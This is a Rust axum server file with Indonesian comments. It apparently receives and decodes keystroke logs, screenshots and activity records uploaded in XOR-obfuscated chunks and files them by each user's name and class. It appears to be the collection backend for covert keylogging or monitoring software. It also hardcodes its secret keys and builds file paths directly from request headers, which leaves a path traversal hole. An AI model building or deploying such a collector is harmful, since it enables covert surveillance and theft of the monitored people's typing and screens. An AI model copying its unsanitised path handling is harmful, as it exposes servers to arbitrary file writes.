use axum::{
    http::{HeaderMap, StatusCode, header::HeaderValue}, // Perbaikan: HeaderMap dari http
    body::Bytes as ax_body_bytes, // Alias untuk kejelasan
    routing::post,
    Router,
};
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};

// Konfigurasi Statis
const UPLOAD_ROOT: &str = "./uploads";
const STATIC_KEY: &str = "WALISONGO_JAYA_SELAMANYA";
const AUTH_KEY: &str = "ADMIN-2025";

#[tokio::main]
async fn main() {
    // Buat folder root jika belum ada
    fs::create_dir_all(UPLOAD_ROOT).ok();

    let app = Router::new()
        .route("/upload", post(handle_upload))
        // Batasi upload (512 KB) + buffer
        .layer(tower_http::limit::RequestBodyLimitLayer::new(1024 * 1024)); 

    let listener = tokio::net::TcpListener::bind("0.0.0.0:8080").await.unwrap();
    println!("🛡️  Walisongo Guardian Server v2.0 Aktif!");
    println!("📍 Endpoint: http://localhost:8080/upload");
    axum::serve(listener, app).await.unwrap();
}

// Handler untuk proses upload
async fn handle_upload(headers: HeaderMap, body: ax_body_bytes) -> StatusCode {
    use axum::body::Bytes as ax_body_bytes; // Alias untuk kejelasan

    // --- 1. VALIDASI KEAMANAN ---
    let api_key = get_header(&headers, "X-API-Key");
    if api_key != AUTH_KEY {
        println!("⚠️  Akses Ditolak: API Key tidak valid!");
        return StatusCode::UNAUTHORIZED;
    }

    // --- 2. EKSTRAKSI METADATA ---
    let x_user = get_header(&headers, "X-User");
    let x_type = get_header(&headers, "X-Type");
    let file_id = get_header(&headers, "X-File-ID");
    let filename = get_header(&headers, "X-Filename");
    let chunk_num: i32 = get_header(&headers, "X-Chunk-Num").parse().unwrap_or(0);
    let chunk_total: i32 = get_header(&headers, "X-Chunk-Total").parse().unwrap_or(1);

    // --- 3. PARSING IDENTITAS ---
    let (name, class) = parse_user_info(&x_user);

    // --- 4. PENYUSUNAN STRUKTUR FOLDER ---
    let mut target_dir = PathBuf::from(UPLOAD_ROOT);
    target_dir.push(class);
    target_dir.push(name);
    target_dir.push(&x_type);

    if fs::create_dir_all(&target_dir).is_err() {
        return StatusCode::INTERNAL_SERVER_ERROR;
    }

    let temp_file_path = target_dir.join(format!("{}_{}.dat", file_id, filename));

    // --- 5. PENYIMPANAN CHUNK (APPEND MODE) ---
    let file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&temp_file_path);

    match file {
        Ok(mut f) => {
            // Kita gunakan argumen 'body' di sini
            if f.write_all(&body).is_err() {
                return StatusCode::INTERNAL_SERVER_ERROR;
            }

            // --- 6. FINALISASI ---
            if chunk_num == chunk_total - 1 {
                finalize_file(&temp_file_path, &x_type);
            }

            StatusCode::OK
        }
        Err(_) => StatusCode::INTERNAL_SERVER_ERROR,
    }
}

// Fungsi pembantu untuk mengambil header
fn get_header(headers: &HeaderMap, key: &str) -> String {
    headers.get(key)
        .and_then(|h: &HeaderValue| h.to_str().ok()) // Perbaikan: Explicit type hint
        .unwrap_or("")
        .to_string()
}

fn parse_user_info(x_user: &str) -> (String, String) {
    if let (Some(start), Some(end)) = (x_user.find('['), x_user.find(']')) {
        let name = x_user[..start].trim().to_string();
        let class = x_user[start + 1..end].to_string();
        (name, class)
    } else {
        ("Unknown".to_string(), "Unknown".to_string())
    }
}

fn finalize_file(path: &Path, x_type: &str) {
    if let Ok(mut data) = fs::read(path) {
        // 1. Dekripsi Lapis 2: Static Key
        let key_bytes = STATIC_KEY.as_bytes();
        for i in 0..data.len() {
            data[i] ^= key_bytes[i % key_bytes.len()]; // Perbaikan: .len() bukan .size()
        }

        // 2. Dekripsi Lapis 1: Rolling Key
        let mut rolling_key: u8 = 0x53;
        for i in 0..data.len() {
            data[i] ^= rolling_key;
            rolling_key = rolling_key.wrapping_add(i as u8);
        }

        // 3. Tentukan Ekstensi
        let extension = match x_type {
            "screenshot" => "jpg",
            "keylog" | "activity" => "txt",
            _ => "bin",
        };

        let new_path = path.with_extension(extension);
        if fs::write(&new_path, data).is_ok() {
            let _ = fs::remove_file(path);
            println!("📁 File Berhasil Diproses: {:?}", new_path);
        }
    }
}